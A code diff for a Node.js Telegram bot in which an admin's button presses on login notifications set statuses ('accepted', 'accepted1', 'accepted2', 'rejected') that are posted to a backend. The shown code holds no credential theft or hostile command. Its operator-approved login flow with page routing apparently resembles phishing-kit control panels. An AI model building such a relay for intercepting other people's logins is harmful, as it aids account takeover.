@@ -1,4 +1,3 @@
-// bot.js (merged version)
 const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
@@ -119,24 +118,26 @@ async function sendLoginTelegram(email) {
   await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
-
 // -----------------
-// Handle button clicks (merged)
+// Handle button clicks (merged, with page1/page2 support)
 // -----------------
 bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
-    const status = action === "accept" ? "accepted" : "rejected";
+    let status;
+    if (action === "accept") status = "accepted";
+    else if (action === "page1") status = "accepted1";
+    else if (action === "page2") status = "accepted2";
+    else status = "rejected";
 
     // Notify backend
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      // Support both email + identifier formats
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Try HTML first (small code style), fallback to Markdown (big code style)
+    // Try HTML first, fallback to Markdown
     try {
       await bot.editMessageText(
         `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
@@ -183,4 +184,3 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram
 };
-
